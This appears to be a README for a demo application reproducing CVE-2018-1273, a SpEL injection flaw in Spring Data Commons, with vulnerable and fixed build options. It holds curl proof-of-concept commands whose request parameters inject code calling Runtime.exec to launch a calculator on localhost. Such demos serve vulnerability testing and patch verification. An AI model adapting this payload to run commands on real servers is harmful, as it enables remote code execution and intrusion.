# CVE-2018-1273

Spring Data Commons, versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5, and older unsupported versions, contain a property binder vulnerability caused by improper neutralization of special elements. An unauthenticated remote malicious user (or attacker) can supply specially crafted request parameters against Spring Data REST backed HTTP resources or using Spring Data’s projection-based request payload binding hat can lead to a remote code execution attack.

More information [here](https://pivotal.io/security/cve-2018-1273)

# Running 

The application can be tested with the vulnerable version or the fixed version of Spring Data Commons. 

* Vulnerable version (by default):

```
mvn spring-boot:run
```

* Fixed version:

```
mvn spring-boot:run -Dfixed
```

# Testing the vulnerability

Run the following command to check if the vulnerability can be exploited:

* On Windows:

```
curl -X POST http://localhost:8080/account -d "name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('calc.exe')]=123"

```

* On MacOs:

```
curl -X POST http://localhost:8080/account -d "name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('/Applications/Calculator.app/Contents/MacOS/Calculator')]=test"

```

# Credits
Created by https://www.arima.eu

![ARIMA Software Design](https://arima.eu/arima-claim.png)
